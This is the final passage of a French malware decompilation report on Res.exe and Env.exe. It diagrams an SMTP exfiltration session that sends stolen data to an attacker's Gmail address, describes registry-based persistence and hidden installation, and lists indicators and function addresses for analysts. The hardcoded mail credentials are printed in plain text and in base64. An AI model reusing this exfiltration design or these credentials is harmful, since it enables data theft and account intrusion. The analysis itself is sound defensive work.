│  │              [Send]        [Exit]             │          │
│  └───────────────────────────────────────────────┘          │
│                                                              │
│  Valeurs pré-remplies:                                       │
│  • Serveur : smtp.laposte.net                                │
│  • Username: aaaaaaaaaaaa@laposte.net                        │
│  • Password: z98tmFrance (credentials hardcodés!)            │
│  • To      : aaaaaaaaaaaa@gmail.com                          │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  Utilisateur clique sur [Send]                               │
│  (ou l'attaquant déclenche l'envoi programmatiquement)       │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  SmtpClient::sendMail() @ 0x4060d0                           │
│                                                              │
│  [1] Connexion TCP                                           │
│      QTcpSocket::connectToHost(smtp.laposte.net, 587)       │
│      (ou connectToHostEncrypted pour SSL/TLS)                │
│                                                              │
│  [2] Handshake SMTP                                          │
│      ← 220 smtp.laposte.net Service ready                   │
│      → EHLO localhost                                        │
│      ← 250 OK                                                │
│                                                              │
│  [3] Authentification LOGIN                                  │
│      → AUTH LOGIN                                            │
│      ← 334 Username:                                         │
│      → YWFhYWFhYWFhYWFhYUBsYXBvc3RlLm5ldA==                 │
│         (base64: aaaaaaaaaaaa@laposte.net)                   │
│      ← 334 Password:                                         │
│      → ejk4dG1GcmFuY2U=                                      │
│         (base64: z98tmFrance)                                │
│      ← 235 Authentication successful                         │
│                                                              │
│  [4] Transaction email                                       │
│      → MAIL FROM:<aaaaaaaaaaaa@laposte.net>                 │
│      ← 250 OK                                                │
│      → RCPT TO:<destination@victim.com>                     │
│      ← 250 OK                                                │
│      → DATA                                                  │
│      ← 354 Start mail input                                  │
│      → To: destination@victim.com                            │
│      → From: aaaaaaaaaaaa@laposte.net                        │
│      → Subject: Données exfiltrées                           │
│      →                                                       │
│      → [CONTENU DU MESSAGE - DONNÉES VOLÉES]                │
│      → .                                                     │
│      ← 250 Message accepted                                  │
│                                                              │
│  [5] Déconnexion                                             │
│      → QUIT                                                  │
│      ← 221 Bye                                               │
│      (fermeture socket)                                      │
└──────────────────┬──────────────────────────────────────────┘
                   │
                   ▼
┌─────────────────────────────────────────────────────────────┐
│  DONNÉES EXFILTRÉES AVEC SUCCÈS!                             │
│  → Email reçu par l'attaquant à aaaaaaaaaaaa@gmail.com      │
│  → Peut contenir: passwords, fichiers, screenshots, etc.    │
└─────────────────────────────────────────────────────────────┘
```

### Diagramme d'états SMTP

```
                 ┌───────────────┐
                 │     Init      │
                 └───────┬───────┘
                         │ 220 Service ready
                         ▼
                 ┌───────────────┐
                 │   Handshake   │
                 │  EHLO sent    │
                 └───────┬───────┘
                         │ 250 OK
                         ▼
                 ┌───────────────┐
                 │   Auth Init   │
                 │AUTH LOGIN sent│
                 └───────┬───────┘
                         │ 334 Username:
                         ▼
                 ┌───────────────┐
                 │  Username     │
                 │  sent (b64)   │
                 └───────┬───────┘
                         │ 334 Password:
                         ▼
                 ┌───────────────┐
                 │  Password     │
                 │  sent (b64)   │
                 └───────┬───────┘
                         │ 235 Auth OK
                         ▼
                 ┌───────────────┐
                 │ Authenticated │
                 │ MAIL FROM sent│
                 └───────┬───────┘
                         │ 250 OK
                         ▼
                 ┌───────────────┐
                 │ MailFrom OK   │
                 │  RCPT TO sent │
                 └───────┬───────┘
                         │ 250 OK
                         ▼
                 ┌───────────────┐
                 │  RcptTo OK    │
                 │  DATA sent    │
                 └───────┬───────┘
                         │ 354 Start mail
                         ▼
                 ┌───────────────┐
                 │ Data Header   │
                 │ Message sent  │
                 │    + "."      │
                 └───────┬───────┘
                         │ 250 Accepted
                         ▼
                 ┌───────────────┐
                 │ Message Sent  │
                 │  QUIT sent    │
                 └───────┬───────┘
                         │ 221 Bye
                         ▼
                 ┌───────────────┐
                 │     Close     │
                 └───────────────┘
```

### Flux de données complet

```
┌────────────┐          ┌────────────┐          ┌──────────────┐
│   Victime  │          │  Malware   │          │  Attaquant   │
└─────┬──────┘          └─────┬──────┘          └──────┬───────┘
      │                       │                         │
      │  1. Télécharge        │                         │
      │     & exécute ────────>                         │
      │     Res.exe           │                         │
      │                       │                         │
      │                       │  2. Installation        │
      │                       │     silencieuse         │
      │                       │     • Cache console     │
      │                       │     • Copie fichiers    │
      │                       │     • Registre Windows  │
      │                       │                         │
      │  3. Redémarrage       │                         │
      │     Windows           │                         │
      │                       │                         │
      │                       │  4. Lancement auto      │
      │                       │     Env.exe             │
      │                       │                         │
      │                       │  5. Interface SMTP      │
      │  <─ ─ ─ ─ ─ ─ ─ ─ ─ ─ │     s'affiche           │
      │    (si GUI visible)   │                         │
      │                       │                         │
      │                       │  6. Collecte données    │
      │                       │     • Keylogger?        │
      │                       │     • Screenshots?      │
      │                       │     • Fichiers?         │
      │                       │                         │
      │                       │  7. Connexion SMTP      │
      │                       │  smtp.laposte.net:587   │
      │                       │  (credentials hardcodés)│
      │                       │                         │
      │                       │  8. Envoi email ────────┼────────>
      │                       │     avec données        │         │
      │                       │                         │    ┌────▼────┐
      │                       │                         │    │  Inbox  │
      │                       │                         │    │ Gmail   │
      │                       │                         │    └────┬────┘
      │                       │                         │         │
      │                       │                         <─────────┘
      │                       │                         │  9. Lecture
      │                       │                         │     des données
      │                       │                         │
      └───────────────────────┴─────────────────────────┴─────────────
```

---

## CONCLUSION

### Résumé de la décompilation

**Res.exe:**
- Fonction principale @ 0x401aa0 (722 octets)
- 15 appels à system() pour installation
- Manipulation registre Windows via Qt QSettings
- Auto-réplication vers c:\WindSyst
- Persistance configurée au démarrage

**Env.exe:**
- Interface graphique Qt complète
- Classe SmtpClient @ 0x4060d0 (5427 octets)
- Machine à états SMTP complète
- Support SSL/TLS (QSslSocket)
- Credentials hardcodés dans .rdata

### Points d'intérêt pour analyse dynamique

1. **Fichier de log** : `c:\WindSyst\log.txt` (mentionné mais usage inconnu)
2. **Trafic réseau** : Surveiller connexions vers `smtp.laposte.net:587`
3. **Persistance registre** : Clés `Res` et `Env` dans `Run`
4. **Processus cachés** : Res.exe cache sa console avec ShowWindow(SW_HIDE)

### Adresses clés pour debugging

| Fonction | Adresse | Taille | Fichier |
|----------|---------|--------|---------|
| main (Res) | 0x004035a0 | 157 | Res.exe |
| install_malware | 0x00401aa0 | 722 | Res.exe |
| system() import | 0x004031dc | 6 | Res.exe |
| main (Env) | 0x004077a0 | 72 | Env.exe |
| create_smtp_gui | 0x00405b90 | 377 | Env.exe |
| create_main_window | 0x00401630 | 1675 | Env.exe |
| SmtpClient | 0x004060d0 | 5427 | Env.exe |

---

**FIN DU RAPPORT DE DÉCOMPILATION**
